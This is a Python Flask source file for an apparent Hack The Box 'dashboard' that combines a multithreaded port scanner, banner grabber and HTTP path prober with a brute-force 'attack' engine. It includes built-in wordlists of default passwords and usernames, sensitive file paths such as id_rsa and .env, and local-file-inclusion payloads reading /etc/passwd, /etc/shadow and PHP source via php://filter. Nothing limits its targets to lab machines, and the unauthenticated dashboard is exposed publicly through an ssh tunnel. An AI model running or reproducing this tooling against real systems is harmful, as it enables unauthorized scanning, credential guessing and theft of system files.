from flask import Flask, render_template
from flask_socketio import SocketIO
import requests as req
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
import socket as sock
import time
import re

app = Flask(__name__)
app.config['SECRET_KEY'] = 'htbdash-x9k2'
socketio = SocketIO(app, cors_allowed_origins='*', async_mode='threading')

# ── State ────────────────────────────────────────────────────
scan_stop   = Event()
attack_stop = Event()
scan_active   = False
attack_active = False

# ── Port / service data ──────────────────────────────────────
HTB_PORTS = sorted({
    21,22,23,25,53,79,80,88,110,111,135,139,143,161,
    389,443,445,465,512,513,514,587,631,636,
    993,995,1080,1099,1433,1521,2049,2121,2375,2376,2379,
    3000,3001,3268,3306,3389,3690,4369,4444,4848,
    5000,5432,5601,5672,5800,5900,5984,
    6379,6443,7001,7180,7474,
    8000,8008,8080,8081,8082,8083,8088,8089,8090,8443,8888,8983,
    9000,9090,9092,9200,9300,9418,9999,
    10000,11211,15672,27017,28017,50000,50070
})

SERVICES = {
    21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',79:'Finger',
    80:'HTTP',88:'Kerberos',110:'POP3',111:'RPC',135:'MSRPC',
    139:'NetBIOS',143:'IMAP',161:'SNMP',389:'LDAP',443:'HTTPS',
    445:'SMB',465:'SMTPS',512:'Rexec',513:'Rlogin',514:'RSH',
    587:'SMTP',631:'IPP',636:'LDAPS',993:'IMAPS',995:'POP3S',
    1080:'SOCKS5',1099:'RMI',1433:'MSSQL',1521:'Oracle',
    2049:'NFS',2121:'FTP-Alt',2375:'Docker',2376:'Docker-TLS',
    2379:'etcd',3000:'HTTP?',3001:'HTTP?',3268:'LDAP-GC',
    3306:'MySQL',3389:'RDP',3690:'SVN',4369:'Erlang',
    4444:'RAT?',4848:'GlassFish',5000:'HTTP?',5432:'PostgreSQL',
    5601:'Kibana',5672:'AMQP',5800:'VNC-HTTP',5900:'VNC',
    5984:'CouchDB',6379:'Redis',6443:'K8s-API',7001:'WebLogic',
    7180:'Cloudera',7474:'Neo4j',8000:'HTTP?',8008:'HTTP?',
    8080:'HTTP-Alt',8081:'HTTP?',8082:'HTTP?',8083:'HTTP?',
    8088:'HTTP?',8089:'Splunk',8090:'HTTP?',8443:'HTTPS-Alt',
    8888:'Jupyter?',8983:'Solr',9000:'HTTP?',9090:'HTTP?',
    9092:'Kafka',9200:'Elasticsearch',9300:'ES-Transport',
    9418:'Git',9999:'HTTP?',10000:'Webmin',11211:'Memcached',
    15672:'RabbitMQ',27017:'MongoDB',28017:'MongoDB-HTTP',
    50000:'DB2',50070:'HDFS',
}

WEB_PORTS = {
    80,443,3000,3001,4848,5000,5601,5800,7001,7180,7474,
    8000,8008,8080,8081,8082,8083,8088,8089,8090,8443,8888,8983,
    9000,9090,9200,10000,15672,28017,50070
}

HTTP_PATHS = [
    '/robots.txt','/.git/HEAD','/.env','/.htaccess',
    '/admin','/login','/dashboard','/panel',
    '/api','/api/v1','/api/v2',
    '/config','/backup','/secret','/flag',
    '/phpmyadmin','/wp-admin','/wp-login.php',
    '/server-status','/phpinfo.php','/info.php',
    '/console','/manager','/actuator','/actuator/env',
]

# ── Routes ───────────────────────────────────────────────────
@app.route('/')
def index():
    return render_template('index.html')

# ── Scan ─────────────────────────────────────────────────────
@socketio.on('start_scan')
def on_scan(data):
    global scan_active, scan_stop
    if scan_active:
        return
    scan_stop.clear()
    threading.Thread(target=run_scan, args=(data,), daemon=True).start()

@socketio.on('stop_scan')
def on_stop_scan():
    scan_stop.set()

def check_port(host, port, timeout=0.8):
    try:
        s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        s.settimeout(timeout)
        ok = s.connect_ex((host, port)) == 0
        s.close()
        return ok
    except Exception:
        return False

def grab_banner(host, port, timeout=2):
    try:
        s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        probes = {
            22: b'',
            21: b'',
            80: b'HEAD / HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n',
        }
        probe = probes.get(port, b'\r\n')
        if probe:
            s.send(probe)
        raw = s.recv(512)
        s.close()
        return raw.decode('utf-8', errors='replace').strip()[:200]
    except Exception:
        return ''

def http_probe(host, port):
    ssl = port in {443, 8443}
    scheme = 'https' if ssl else 'http'
    base = f'{scheme}://{host}:{port}'
    info = {'url': base, 'title': '', 'server': '', 'status': 0, 'paths': [], 'interesting': []}

    # Root
    try:
        r = req.get(base + '/', timeout=5, verify=False, allow_redirects=True)
        m = re.search(r'<title[^>]*>([^<]{1,80})', r.text, re.I)
        info['title']  = m.group(1).strip() if m else ''
        info['server'] = r.headers.get('Server', '')[:50]
        info['status'] = r.status_code
        info['cookies']= list(r.cookies.keys())
        # Note interesting headers
        for h in ('X-Powered-By','X-Generator','X-AspNet-Version','X-Frame-Options'):
            if h in r.headers:
                info['interesting'].append(f'{h}: {r.headers[h]}')
    except Exception:
        return info

    # Path probe
    for path in HTTP_PATHS:
        if scan_stop.is_set():
            break
        try:
            r2 = req.get(base + path, timeout=2, verify=False, allow_redirects=False)
            if r2.status_code not in (404, 400, 410):
                info['paths'].append({
                    'path':   path,
                    'status': r2.status_code,
                    'size':   len(r2.content),
                })
        except Exception:
            pass

    return info

def run_scan(data):
    global scan_active
    scan_active = True

    host      = data.get('host', '').strip()
    port_mode = data.get('port_mode', 'common')
    threads   = min(int(data.get('threads', 150)), 250)

    if not host:
        socketio.emit('log', {'msg': 'No target specified', 'type': 'error'})
        scan_active = False
        return

    # Resolve hostname → IP for display
    try:
        ip = sock.gethostbyname(host)
    except Exception:
        ip = host

    if port_mode == 'common':
        ports = HTB_PORTS
    elif port_mode == 'all':
        ports = range(1, 65536)
    else:
        try:
            a, b = port_mode.split('-')
            ports = range(int(a), int(b) + 1)
        except Exception:
            ports = HTB_PORTS

    ports = list(ports)
    total = len(ports)

    socketio.emit('scan_status', {'state': 'running', 'host': host, 'ip': ip, 'total': total})
    socketio.emit('log', {'msg': f'Target: {host} ({ip})', 'type': 'info'})
    socketio.emit('log', {'msg': f'Scanning {total} ports with {threads} threads...', 'type': 'info'})

    open_ports = []
    scanned    = [0]
    t0         = time.time()

    def scan_one(port):
        if scan_stop.is_set():
            return None
        is_open = check_port(host, port)
        scanned[0] += 1
        pct = round(scanned[0] / total * 100, 1)
        socketio.emit('scan_tick', {'scanned': scanned[0], 'total': total, 'progress': pct,
                                    'rate': round(scanned[0] / max(time.time() - t0, 0.001), 0)})
        if is_open:
            svc = SERVICES.get(port, '?')
            socketio.emit('port_found', {'port': port, 'service': svc})
            socketio.emit('log', {'msg': f'OPEN   {port}/tcp   {svc}', 'type': 'hit'})
            return {'port': port, 'service': svc}
        return None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_one, p): p for p in ports}
        for f in as_completed(futures):
            if scan_stop.is_set():
                break
            r = f.result()
            if r:
                open_ports.append(r)

    if scan_stop.is_set():
        socketio.emit('scan_status', {'state': 'stopped'})
        scan_active = False
        return

    elapsed = time.time() - t0
    socketio.emit('log', {'msg': f'Port scan done in {elapsed:.1f}s — {len(open_ports)} open', 'type': 'success'})

    # Phase 2: banners + HTTP probe
    if open_ports:
        socketio.emit('log', {'msg': 'Probing services...', 'type': 'info'})
        for pi in sorted(open_ports, key=lambda x: x['port']):
            if scan_stop.is_set():
                break
            port = pi['port']

            banner = grab_banner(host, port)
            if banner:
                first_line = banner.splitlines()[0][:120]
                socketio.emit('banner', {'port': port, 'banner': first_line})
                socketio.emit('log', {'msg': f'  [{port}] {first_line}', 'type': 'info'})

            is_web = (port in WEB_PORTS or
                      'http' in pi['service'].lower() or
                      'HTTP' in banner.upper()[:50])
            if is_web:
                socketio.emit('log', {'msg': f'  [{port}] HTTP probe...', 'type': 'info'})
                info = http_probe(host, port)
                socketio.emit('http_found', {'port': port, 'info': info})
                if info['title']:
                    socketio.emit('log', {'msg': f'  [{port}] Title: "{info["title"]}"', 'type': 'info'})
                for p in info['paths']:
                    c = 'hit' if p['status'] in (200, 301, 302) else 'warn'
                    socketio.emit('log', {'msg': f'  [{port}] {p["path"]}  →  {p["status"]}  ({p["size"]}b)', 'type': c})

    socketio.emit('scan_status', {'state': 'done'})
    socketio.emit('log', {'msg': f'Scan complete. Total time: {time.time()-t0:.1f}s', 'type': 'success'})
    scan_active = False

# ── Attack ───────────────────────────────────────────────────
@socketio.on('start_attack')
def on_start(data):
    global attack_active, attack_stop
    if attack_active:
        return
    attack_stop.clear()
    threading.Thread(target=run_attack, args=(data,), daemon=True).start()

@socketio.on('stop_attack')
def on_stop():
    attack_stop.set()

def parse_headers(raw):
    h = {}
    for line in raw.strip().splitlines():
        if ':' in line:
            k, v = line.split(':', 1)
            h[k.strip()] = v.strip()
    return h

PRESETS_SERVER = {
    'passwords': ['admin','password','123456','password123','admin123','letmein',
        'qwerty','12345','root','toor','pass','test','guest','welcome','login',
        'secret','master','dragon','abc123','changeme','default','sysadmin',
        'P@ssw0rd','p@ssword','passw0rd','Admin1234','111111','000000',
        '123123','654321','football','shadow','superman','1234567890'],
    'users': ['admin','root','administrator','user','test','guest','demo',
        'operator','manager','support','service','system','sysadmin','dev',
        'developer','security','backup','mysql','www','apache','nginx',
        'ubuntu','ec2-user','pi','oracle','webmaster'],
    'dirs': ['admin','login','dashboard','api','backup','config','uploads','files',
        'images','static','includes','data','db','secret','panel','manage',
        'administrator','wp-admin','phpmyadmin','.env','.git','shell','cmd',
        'console','debug','test','dev','old','bak','temp','tmp','logs',
        'scripts','app','src','assets','media','robots.txt','sitemap.xml',
        'portal','internal','private','restricted','hidden','flag'],
    'files': ['.env','config.php','config.py','settings.py','database.php',
        '.htaccess','web.config','backup.zip','backup.tar.gz','db.sql',
        'dump.sql','id_rsa','.ssh/id_rsa','flag.txt','flag','secret.txt',
        'credentials.txt'],
    'api': ['api/v1','api/v2','api/users','api/admin','api/flag','api/login',
        'api/auth','api/token','api/key','api/secret','api/config','api/debug',
        'graphql','swagger','swagger.json','openapi.json','docs','redoc'],
    'lfi': ['../etc/passwd','../../etc/passwd','../../../etc/passwd',
        '../../../../etc/passwd','../etc/shadow','../../etc/shadow',
        '../proc/self/environ','....//etc/passwd','....////etc/passwd',
        '/etc/passwd','/etc/shadow','/etc/hosts','/proc/self/environ',
        '/var/log/apache2/access.log','/var/log/nginx/access.log',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=config.php'],
}

@socketio.on('get_preset')
def on_preset(data):
    name = data.get('name','')
    socketio.emit('preset_data', {'name': name, 'words': PRESETS_SERVER.get(name, [])})

def run_attack(data):
    global attack_active
    attack_active = True

    url_template  = data.get('url','').strip()
    method        = data.get('method','get').lower()
    body_template = data.get('body','').strip()
    headers       = parse_headers(data.get('headers',''))
    success_key   = data.get('success_key','').strip()
    success_text  = data.get('success_text','').strip()
    success_code  = data.get('success_code','').strip()
    fail_text     = data.get('fail_text','').strip()
    threads       = max(1, min(int(data.get('threads', 10)), 50))
    mode          = data.get('mode','numeric')

    if mode == 'wordlist':
        items = [w.strip() for w in data.get('words',[]) if w.strip()]
        if not items:
            socketio.emit('log', {'msg': 'No words in wordlist', 'type': 'error'})
            attack_active = False
            socketio.emit('attack_status', {'state': 'idle'})
            return
    else:
        start = max(0, int(data.get('start', 0)))
        end   = min(9999, int(data.get('end', 9999)))
        items = [f'{i:04d}' for i in range(start, end + 1)]

    total = len(items)
    socketio.emit('attack_status', {'state': 'running'})
    socketio.emit('log', {'msg': f'Attack → {url_template}', 'type': 'info'})
    socketio.emit('log', {'msg': f'{mode.upper()} | {method.upper()} | {threads} threads | {total} items', 'type': 'info'})

    found   = Event()
    counter = [0]
    t0      = time.time()
    session = req.Session()
    session.headers.update(headers)

    def try_word(word):
        if found.is_set() or attack_stop.is_set():
            return None
        url  = url_template.replace('{word}', word).replace('{pin}', word)
        body = body_template.replace('{word}', word).replace('{pin}', word)
        try:
            if method == 'post':
                if '=' in body:
                    form = dict(p.split('=',1) for p in body.split('&') if '='in p)
                    r = session.post(url, data=form, timeout=5, verify=False)
                else:
                    r = session.post(url, data=body or word, timeout=5, verify=False)
            else:
                r = session.get(url, timeout=5, verify=False)
        except Exception:
            return None

        counter[0] += 1
        elapsed  = time.time() - t0
        rate     = counter[0] / elapsed if elapsed > 0 else 0
        progress = counter[0] / total * 100

        hit = False; result = None

        if fail_text and fail_text.lower() in r.text.lower():
            hit = False
        else:
            if success_code and str(r.status_code) == success_code:
                hit, result = True, r.text[:300].strip()
            if not hit:
                try:
                    jb = r.json()
                    if success_key and success_key in jb:
                        hit, result = True, str(jb[success_key])
                    elif success_text and success_text.lower() in str(jb).lower():
                        hit, result = True, str(jb)
                except Exception:
                    if success_text and success_text.lower() in r.text.lower():
                        hit, result = True, r.text.strip()[:300]
            if not hit and not any([success_key,success_text,success_code,fail_text]) and r.ok:
                hit, result = True, r.text[:300].strip()

        socketio.emit('attempt', {
            'word':word,'status':r.status_code,'size':len(r.content),
            'hit':hit,'progress':round(progress,2),'rate':round(rate,1),'count':counter[0],
        })
        return (word, result) if hit else None

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(try_word, w): w for w in items}
        for f in as_completed(futures):
            if attack_stop.is_set():
                break
            res = f.result()
            if res:
                found.set()
                word, val = res
                socketio.emit('found', {'word': word, 'value': val or 'Access granted'})
                socketio.emit('log', {'msg': f'FOUND: {word}  →  {val}', 'type': 'success'})
                break

    if attack_stop.is_set():
        socketio.emit('attack_status', {'state': 'stopped'})
        socketio.emit('log', {'msg': 'Attack stopped', 'type': 'warn'})
    elif not found.is_set():
        socketio.emit('attack_status', {'state': 'not_found'})
        socketio.emit('log', {'msg': f'Not found. {counter[0]} tried.', 'type': 'error'})
    attack_active = False


if __name__ == '__main__':
    print('\n  HTB DASHBOARD  —  http://localhost:5001')
    print('  Public: ssh -R 80:localhost:5001 nokey@localhost.run\n')
    socketio.run(app, host='0.0.0.0', port=5001, debug=False, allow_unsafe_werkzeug=True)
